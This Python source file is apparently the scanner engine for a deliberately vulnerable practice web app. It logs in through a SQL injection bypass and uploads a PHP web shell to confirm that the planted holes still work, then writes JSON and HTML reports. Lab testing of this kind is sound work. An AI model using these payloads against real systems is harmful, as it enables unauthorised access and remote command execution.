#!/usr/bin/env python3
"""
BLVWA Vulnerability Scanner — Main Engine
==========================================
Automated vulnerability validation & reporting for Burger Labs.
"""

import json
import time
import os
import sys
import asyncio
from datetime import datetime
from pathlib import Path

import httpx
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich import print as rprint

from config import *

console = Console()

# ─────────────────────────────────────────────
#  AUTH
# ─────────────────────────────────────────────

async def authenticate(client: httpx.AsyncClient) -> dict:
    """Login via SQLi bypass and return session cookies."""
    # Use SQLi bypass — always works since login is intentionally vulnerable
    login_data = {"username": "admin' OR '1'='1", "password": "anything"}
    
    resp = await client.post(
        f"{TARGET_URL}/login",
        data=login_data,
        follow_redirects=True,
        timeout=REQUEST_TIMEOUT,
    )
    cookies = dict(client.cookies)
    cookies.update(dict(resp.cookies))
    
    # Also try with PHPSESSID from response history
    if hasattr(resp, 'history'):
        for r in resp.history:
            cookies.update(dict(r.cookies))
    
    return cookies


# ─────────────────────────────────────────────
#  DETECTION ENGINE
# ─────────────────────────────────────────────

def check_detection(detect: dict, response: httpx.Response, follow_body: str = "") -> bool:
    """Evaluate a detection rule against an HTTP response."""
    dtype = detect.get("type", "")
    body = response.text if response else ""

    if dtype == "body_contains":
        return detect["value"] in body

    elif dtype == "body_contains_any":
        return any(v in body for v in detect.get("values", []))

    elif dtype == "body_contains_after_redirect":
        return detect["value"] in follow_body

    elif dtype == "redirect_to":
        # Check history if redirects were followed
        if hasattr(response, 'history') and response.history:
            for r in response.history:
                location = r.headers.get("location", "")
                if r.status_code in (301, 302) and detect["value"] in location:
                    return True
        location = response.headers.get("location", "")
        return (
            response.status_code in (301, 302)
            and detect["value"] in location
        )

    elif dtype == "redirect_contains":
        if hasattr(response, 'history') and response.history:
            for r in response.history:
                location = r.headers.get("location", "")
                if detect["value"] in location:
                    return True
        location = response.headers.get("location", "")
        return detect["value"] in location

    elif dtype == "cookie_missing_flag":
        cookie_header = response.headers.get("set-cookie", "").lower()
        flag = detect.get("flag", "httponly").lower()
        cookie_name = detect.get("cookie", "").lower()
        # If the cookie is set WITHOUT the flag, it's vulnerable
        if cookie_name in cookie_header and flag not in cookie_header:
            return True
        return False

    elif dtype == "status_code":
        return response.status_code == detect["value"]

    return False


# ─────────────────────────────────────────────
#  SINGLE VULN TEST
# ─────────────────────────────────────────────

async def test_vulnerability(client: httpx.AsyncClient, vuln: dict, cookies: dict) -> dict:
    """Test a single vulnerability definition. Returns a result dict."""
    vid = vuln["id"]
    result = {
        "id": vid,
        "name": vuln["name"],
        "category": vuln["category"],
        "severity": vuln["severity"],
        "status": "ERROR",
        "response_code": None,
        "evidence": "",
        "duration_ms": 0,
        "timestamp": datetime.now().isoformat(),
    }

    url = f"{TARGET_URL}{vuln['url']}"
    method = vuln.get("method", "GET")
    start = time.time()

    try:
        resp = None
        follow_body = ""

        if method == "GET":
            resp = await client.get(url, cookies=cookies, follow_redirects=True, timeout=REQUEST_TIMEOUT)

        elif method == "POST":
            resp = await client.post(
                url,
                data=vuln.get("post_data", {}),
                cookies=cookies,
                follow_redirects=True,
                timeout=REQUEST_TIMEOUT,
            )
            # For body_contains_after_redirect, follow the redirect
            if resp.status_code in (301, 302) and vuln["detect"]["type"] == "body_contains_after_redirect":
                redir = resp.headers.get("location", "/")
                redir_url = f"{TARGET_URL}{redir}" if redir.startswith("/") else redir
                resp2 = await client.get(redir_url, cookies=cookies, timeout=REQUEST_TIMEOUT)
                follow_body = resp2.text

        elif method == "POST_MULTIPART":
            # File upload test
            files = {"resume": ("shell.php", b"<?php system($_GET['cmd']); ?>", "application/x-php")}
            data = {"name": "Tester", "email": "t@t.com", "position": "Security"}
            resp = await client.post(url, data=data, files=files, cookies=cookies, follow_redirects=True, timeout=REQUEST_TIMEOUT)

        elif method == "COOKIE_CHECK":
            # Special: login and check cookie flags
            login_resp = await client.post(
                f"{TARGET_URL}/login",
                data=CREDENTIALS["guest"],
                follow_redirects=False,
                timeout=REQUEST_TIMEOUT,
            )
            resp = login_resp

        duration = (time.time() - start) * 1000
        result["duration_ms"] = round(duration)

        if resp is not None:
            result["response_code"] = resp.status_code

            # Run detection
            detected = check_detection(vuln["detect"], resp, follow_body)
            result["status"] = "VULNERABLE" if detected else "NOT_DETECTED"

            # Store evidence snippet
            if detected:
                body = follow_body if follow_body else resp.text
                payload = vuln.get("payload", "")
                if payload and payload in body:
                    idx = body.find(payload)
                    start_idx = max(0, idx - 100)
                    end_idx = min(len(body), idx + len(payload) + 100)
                    result["evidence"] = body[start_idx:end_idx]
                elif vuln["detect"].get("value") and vuln["detect"]["value"] in body:
                    val = vuln["detect"]["value"]
                    idx = body.find(val)
                    result["evidence"] = body[max(0,idx-80):idx+len(val)+80]
                else:
                    result["evidence"] = f"Detection matched. Status={resp.status_code}"

    except httpx.TimeoutException:
        result["status"] = "TIMEOUT"
    except Exception as e:
        result["status"] = "ERROR"
        result["evidence"] = str(e)[:200]

    return result


# ─────────────────────────────────────────────
#  MAIN SCAN ORCHESTRATOR
# ─────────────────────────────────────────────

async def run_scan():
    """Execute the full vulnerability scan."""
    console.rule("[bold red]BLVWA Vulnerability Scanner[/bold red]")
    console.print(f"[cyan]Target:[/cyan] {TARGET_URL}")
    console.print(f"[cyan]Time:[/cyan]   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    # Load vulnerability definitions
    vulns_path = Path(__file__).parent / "vulns.json"
    with open(vulns_path) as f:
        vulns = json.load(f)
    console.print(f"[green]Loaded {len(vulns)} vulnerability definitions[/green]\n")

    # Create evidence directory
    evidence_dir = Path(__file__).parent / "evidence"
    evidence_dir.mkdir(exist_ok=True)

    results = []
    async with httpx.AsyncClient(verify=False) as client:
        # Authenticate
        console.print("[yellow]Authenticating via SQLi bypass...[/yellow]")
        cookies = await authenticate(client)
        if cookies:
            console.print(f"[green]✓ Authenticated ({len(cookies)} cookies): {list(cookies.keys())}[/green]\n")
        else:
            console.print("[red]✗ Auth failed, continuing with unauthenticated tests[/red]")
            # DEBUG: Try to see why it failed
            login_resp = await client.post(f"{TARGET_URL}/login", data={"username": "admin' -- ", "password": "x"}, follow_redirects=True)
            console.print(f"[dim]Debug Login Status: {login_resp.status_code}[/dim]")
            console.print(f"[dim]Debug Login Body: {login_resp.text[:200]}...[/dim]\n")

        # Run tests
        with Progress() as progress:
            task = progress.add_task("[red]Scanning...", total=len(vulns))

            for vuln in vulns:
                test_cookies = cookies if vuln.get("auth_required") else {}
                result = await test_vulnerability(client, vuln, test_cookies)
                results.append(result)
                progress.advance(task)

                # Status indicator
                icon = "✅" if result["status"] == "VULNERABLE" else "❌" if result["status"] == "NOT_DETECTED" else "⚠️"
                # print inline
                severity_color = {"Critical": "red", "High": "yellow", "Medium": "cyan", "Low": "green"}.get(vuln["severity"], "white")
                rprint(f"  {icon} [{severity_color}]{vuln['severity']:8s}[/{severity_color}] {vuln['id']} — {vuln['name']}: [bold]{result['status']}[/bold] ({result['duration_ms']}ms)")

    # Save results
    results_path = evidence_dir / f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(results_path, "w") as f:
        json.dump(results, f, indent=2)

    # Print summary
    print_summary(results, vulns)

    # Generate HTML report
    generate_report(results, vulns)

    return results


# ─────────────────────────────────────────────
#  SUMMARY
# ─────────────────────────────────────────────

def print_summary(results: list, vulns: list):
    """Print scan summary table."""
    console.print("\n")
    console.rule("[bold red]Scan Summary[/bold red]")

    total = len(results)
    working = sum(1 for r in results if r["status"] == "VULNERABLE")
    broken = sum(1 for r in results if r["status"] == "NOT_DETECTED")
    errors = sum(1 for r in results if r["status"] in ("ERROR", "TIMEOUT"))

    table = Table(title="Results Overview")
    table.add_column("Metric", style="cyan")
    table.add_column("Count", style="bold")
    table.add_row("Total Tests", str(total))
    table.add_row("✅ Vulnerable (Working)", f"[green]{working}[/green]")
    table.add_row("❌ Not Detected (Broken)", f"[red]{broken}[/red]")
    table.add_row("⚠️ Errors/Timeouts", f"[yellow]{errors}[/yellow]")
    table.add_row("Success Rate", f"[bold]{working/total*100:.1f}%[/bold]" if total else "0%")
    console.print(table)

    # Category breakdown
    cat_table = Table(title="By Category")
    cat_table.add_column("Category")
    cat_table.add_column("Working", style="green")
    cat_table.add_column("Broken", style="red")
    categories = set(v["category"] for v in vulns)
    for cat in sorted(categories):
        cat_results = [r for r, v in zip(results, vulns) if v["category"] == cat]
        w = sum(1 for r in cat_results if r["status"] == "VULNERABLE")
        b = sum(1 for r in cat_results if r["status"] != "VULNERABLE")
        cat_table.add_row(cat, str(w), str(b))
    console.print(cat_table)


# ─────────────────────────────────────────────
#  HTML REPORT GENERATOR
# ─────────────────────────────────────────────

def generate_report(results: list, vulns: list):
    """Generate a professional HTML report."""
    reports_dir = Path(__file__).parent / "reports"
    reports_dir.mkdir(exist_ok=True)

    total = len(results)
    working = sum(1 for r in results if r["status"] == "VULNERABLE")
    broken = sum(1 for r in results if r["status"] == "NOT_DETECTED")
    errors = total - working - broken

    # Build vuln lookup
    vuln_map = {v["id"]: v for v in vulns}

    rows = ""
    for r in results:
        v = vuln_map.get(r["id"], {})
        status_cls = "pass" if r["status"] == "VULNERABLE" else "fail" if r["status"] == "NOT_DETECTED" else "warn"
        status_label = "✅ Working" if r["status"] == "VULNERABLE" else "❌ Broken" if r["status"] == "NOT_DETECTED" else "⚠️ Error"
        sev_cls = v.get("severity", "Medium").lower()
        evidence_html = f'<code>{r["evidence"][:200]}</code>' if r["evidence"] else "—"

        rows += f"""
        <tr>
            <td><strong>{r['id']}</strong></td>
            <td>{r['name']}</td>
            <td><span class="badge sev-{sev_cls}">{v.get('severity','?')}</span></td>
            <td>{v.get('category','?')}</td>
            <td><span class="badge status-{status_cls}">{status_label}</span></td>
            <td>{r.get('duration_ms',0)}ms</td>
            <td class="evidence">{evidence_html}</td>
            <td>{v.get('cwe','—')}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>BLVWA Vulnerability Scan Report</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ font-family:'Inter',system-ui,sans-serif; background:#0f172a; color:#e2e8f0; padding:2rem; }}
  h1 {{ color:#f43f5e; font-size:2rem; margin-bottom:0.5rem; }}
  .meta {{ color:#94a3b8; margin-bottom:2rem; }}
  .stats {{ display:grid; grid-template-columns:repeat(4,1fr); gap:1rem; margin-bottom:2rem; }}
  .stat {{ background:#1e293b; padding:1.5rem; border-radius:12px; text-align:center; }}
  .stat h3 {{ font-size:2rem; margin-bottom:0.3rem; }}
  .stat p {{ color:#94a3b8; font-size:0.85rem; text-transform:uppercase; letter-spacing:1px; }}
  .stat.pass h3 {{ color:#22c55e; }}
  .stat.fail h3 {{ color:#ef4444; }}
  .stat.warn h3 {{ color:#f59e0b; }}
  .stat.total h3 {{ color:#3b82f6; }}
  table {{ width:100%; border-collapse:collapse; background:#1e293b; border-radius:12px; overflow:hidden; }}
  th {{ background:#0f172a; padding:12px; text-align:left; font-size:0.8rem; color:#94a3b8; text-transform:uppercase; letter-spacing:1px; }}
  td {{ padding:12px; border-bottom:1px solid #334155; font-size:0.85rem; }}
  tr:hover {{ background:#263148; }}
  .badge {{ padding:4px 10px; border-radius:6px; font-size:0.75rem; font-weight:700; }}
  .sev-critical {{ background:#7f1d1d; color:#fca5a5; }}
  .sev-high {{ background:#713f12; color:#fde047; }}
  .sev-medium {{ background:#164e63; color:#67e8f9; }}
  .sev-low {{ background:#14532d; color:#86efac; }}
  .status-pass {{ background:#14532d; color:#22c55e; }}
  .status-fail {{ background:#7f1d1d; color:#ef4444; }}
  .status-warn {{ background:#713f12; color:#f59e0b; }}
  .evidence {{ max-width:300px; overflow:hidden; text-overflow:ellipsis; font-size:0.75rem; color:#94a3b8; }}
  .evidence code {{ background:#0f172a; padding:2px 6px; border-radius:4px; word-break:break-all; }}
  .footer {{ margin-top:2rem; text-align:center; color:#475569; font-size:0.8rem; }}
</style>
</head>
<body>
<h1>🔴 BLVWA — Vulnerability Scan Report</h1>
<p class="meta">Target: {TARGET_URL} | Scan: {datetime.now().strftime('%Y-%m-%d %H:%M')} | Engine: BLVWA Scanner v1.0</p>

<div class="stats">
  <div class="stat total"><h3>{total}</h3><p>Total Tests</p></div>
  <div class="stat pass"><h3>{working}</h3><p>Working</p></div>
  <div class="stat fail"><h3>{broken}</h3><p>Broken</p></div>
  <div class="stat warn"><h3>{errors}</h3><p>Errors</p></div>
</div>

<table>
<thead>
<tr><th>ID</th><th>Vulnerability</th><th>Severity</th><th>Category</th><th>Status</th><th>Time</th><th>Evidence</th><th>CWE</th></tr>
</thead>
<tbody>
{rows}
</tbody>
</table>

<p class="footer">Generated by BLVWA Vulnerability Scanner — Burger Labs Offensive Security Framework</p>
</body>
</html>"""

    report_path = reports_dir / f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    with open(report_path, "w") as f:
        f.write(html)
    console.print(f"\n[green]📄 Report saved: {report_path}[/green]")


# ─────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────

if __name__ == "__main__":
    asyncio.run(run_scan())
